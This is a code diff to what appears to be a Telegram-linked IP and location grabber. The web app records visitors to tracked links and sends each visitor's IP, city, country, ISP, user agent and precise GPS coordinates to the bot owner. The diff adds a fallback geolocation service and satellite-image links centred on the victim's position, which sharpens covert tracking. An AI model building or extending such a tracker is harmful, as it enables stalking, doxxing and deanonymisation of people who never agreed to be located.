@@ -84,11 +84,21 @@ def gen_id():
     return ''.join(random.choices(string.ascii_letters + string.digits, k=8))
 
 def get_ip_info(ip):
+    first_ip = ip.split(',')[0].strip()
     try:
-        r = requests.get(f"http://ip-api.com/json/{ip}?fields=country,city,isp,lat,lon,query", timeout=5)
-        return r.json()
+        r = requests.get(f"http://ip-api.com/json/{first_ip}?fields=country,city,isp,lat,lon,query", timeout=5)
+        data = r.json()
+        if data.get('city'):
+            return data
     except:
-        return {}
+        pass
+    try:
+        r = requests.get(f"https://ipapi.co/{first_ip}/json/", timeout=5)
+        data = r.json()
+        return {'country': data.get('country_name', '?'), 'city': data.get('city', '?'), 'isp': data.get('org', '?'), 'lat': data.get('latitude'), 'lon': data.get('longitude'), 'query': first_ip}
+    except:
+        pass
+    return {'country': '?', 'city': '?', 'isp': '?', 'lat': None, 'lon': None, 'query': first_ip}
 
 @app.route('/')
 def home():
@@ -141,16 +151,24 @@ async def notify(uid, lid, v):
             acc = v['gps'].get('acc', 10)
             geo = InputMediaGeoPoint(geo_point=InputGeoPoint(lat=lat, long=lon, accuracy_radius=int(acc) if acc else 10))
             await bot.send_file(uid, file=geo, caption=f"📍 Точный GPS (±{acc}м)")
-            await bot.send_message(uid, f"🗺 [Google Maps](https://maps.google.com/?q={lat},{lon})", link_preview=True)
+            maps_link = f"https://maps.google.com/?q={lat},{lon}"
+            await bot.send_message(uid, f"🗺 [Открыть в Google Maps]({maps_link})", link_preview=True)
+            satellite_img = f"https://maps.googleapis.com/maps/api/staticmap?center={lat},{lon}&zoom=18&size=600x400&maptype=satellite&markers=color:red%7C{lat},{lon}"
+            await bot.send_message(uid, f"🛰 [Фото места со спутника]({satellite_img})", link_preview=True)
         elif v.get('lat') and v.get('lon'):
-            geo = InputMediaGeoPoint(geo_point=InputGeoPoint(lat=v['lat'], long=v['lon'], accuracy_radius=500))
+            lat, lon = v['lat'], v['lon']
+            geo = InputMediaGeoPoint(geo_point=InputGeoPoint(lat=lat, long=lon, accuracy_radius=500))
             await bot.send_file(uid, file=geo, caption="📍 IP-геолокация (±500м)")
-            await bot.send_message(uid, f"🗺 [Google Maps](https://maps.google.com/?q={v['lat']},{v['lon']})", link_preview=True)
+            maps_link = f"https://maps.google.com/?q={lat},{lon}"
+            await bot.send_message(uid, f"🗺 [Открыть в Google Maps]({maps_link})", link_preview=True)
+            satellite_img = f"https://maps.googleapis.com/maps/api/staticmap?center={lat},{lon}&zoom=16&size=600x400&maptype=satellite&markers=color:red%7C{lat},{lon}"
+            await bot.send_message(uid, f"🛰 [Фото места со спутника]({satellite_img})", link_preview=True)
         
         msg = f"""🎯 **Новый переход!**
 🕐 {v['time']}
-🌐 IP: `{v['ip']}`
+🌐 IP: `{v['ip'].split(',')[0].strip()}`
 🏙 Город: {v.get('city', '?')}
+🌍 Страна: {v.get('country', '?')}
 📡 Провайдер: {v.get('isp', '?')}
 📱 {v.get('ua', '?')[:150]}
 """
